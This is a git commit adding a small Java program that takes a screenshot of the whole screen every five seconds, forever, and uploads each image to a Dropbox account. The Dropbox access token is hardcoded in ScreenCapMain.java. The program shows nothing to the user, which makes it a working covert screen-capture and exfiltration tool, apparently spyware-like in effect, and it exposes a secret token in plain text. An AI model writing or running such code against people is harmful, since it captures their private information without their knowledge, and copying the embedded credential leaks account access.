7ad39a7703bdd4a930d5b7b43494f46c58b11a72
Alex <aleksandr.surkov@outlook.com>
2020-09-14 22:48:43 +0300

    Upload

---
+++ src/ScreenCapMain.java
@@ -0,0 +1,52 @@
+import com.dropbox.core.DbxRequestConfig;
+import com.dropbox.core.v2.DbxClientV2;
+import javax.imageio.ImageIO;
+import java.awt.*;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+
+import static java.lang.Thread.sleep;
+
+public class ScreenCapMain {
+
+    public static void main(String[] args) {
+
+        final String ACCESS_TOKEN = "W4Md5J_Sa5AAAAAAAAAAAVsHqEgowVi72EJq20_zcaW_YTTbyO5rAWpsmo5YSMq1";
+        Robot r = null;
+        try {
+            r = new Robot();
+        } catch (AWTException e) {
+            e.printStackTrace();
+        }
+
+        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
+        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
+        for(;;) {
+
+            BufferedImage image = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+            ByteArrayOutputStream os = new ByteArrayOutputStream();
+
+            try {
+                ImageIO.write(image, "png", os);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+
+            InputStream in = new ByteArrayInputStream(os.toByteArray());
+
+            UploadThread upl = new UploadThread(client, in);
+
+            upl.start();
+
+            try {
+                sleep(5000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+}
---
+++ src/UploadThread.java
@@ -0,0 +1,32 @@
+import com.dropbox.core.v2.DbxClientV2;
+
+import java.io.InputStream;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+
+public class UploadThread extends Thread {
+
+
+    private DbxClientV2 client;
+    private InputStream in;
+
+    public UploadThread(DbxClientV2 client, InputStream in) {
+        this.client = client;
+        this.in = in;
+    }
+
+    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
+    Date now = new Date();
+
+
+    @Override
+    public void run() {
+
+        try {
+
+            client.files().uploadBuilder("/" + dateFormat.format(now) + ".png").uploadAndFinish(in);
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+    }
+}
